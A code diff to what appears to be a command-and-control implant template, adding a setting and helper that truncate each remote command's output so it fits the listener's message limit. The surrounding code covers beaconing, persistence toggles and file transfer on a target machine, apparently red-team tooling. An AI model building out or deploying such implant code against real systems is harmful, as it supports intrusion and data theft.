@@ -74,6 +74,10 @@ class StubConfig:
     sleep: int = 60                    # seconds
     jitter: int = 20                   # percent (0-100)
 
+    # One command's reply is clipped to this many characters, so a `find /` on
+    # the target cannot outgrow the listener's per-message ceiling.
+    max_output: int = 262144
+
     # Feature toggles — off by default: a lab run of a fresh payload must not
     # write registry/crontab entries or open a relay listener unasked.
     persistence: bool = False
@@ -1407,6 +1411,13 @@ def _run_command(text: str) -> str:
         raise
     except Exception as e:
         return f"error: {e}"
+    if task.get("action") in ("fs_get", "fs_put"):
+        # Transfer replies are already chunked to fit and must stay parseable.
+        return _render_result(result)
+    return _clip(_render_result(result))
+
+
+def _render_result(result) -> str:
     if isinstance(result, dict) and "stdout" in result:
         out = result.get("stdout") or ""
         err = result.get("stderr") or ""
@@ -1422,6 +1433,19 @@ def _run_command(text: str) -> str:
         return _j.dumps(result, default=str)
     except Exception:
         return str(result)
+
+
+def _clip(text: str) -> str:
+    """Keep one command from outgrowing the listener's message ceiling.
+
+    A line over MAX_MESSAGE_BYTES kills the connection mid-transfer, taking
+    every other session command down with it.
+    """
+    limit = {{ cfg.max_output }}
+    if len(text) <= limit:
+        return text
+    return text[:limit] + f"\n[output truncated at {limit} chars]"
+
 
 def _parse_command(text: str) -> dict:
     # A line that is already a JSON task bypasses the vocabulary: file transfer
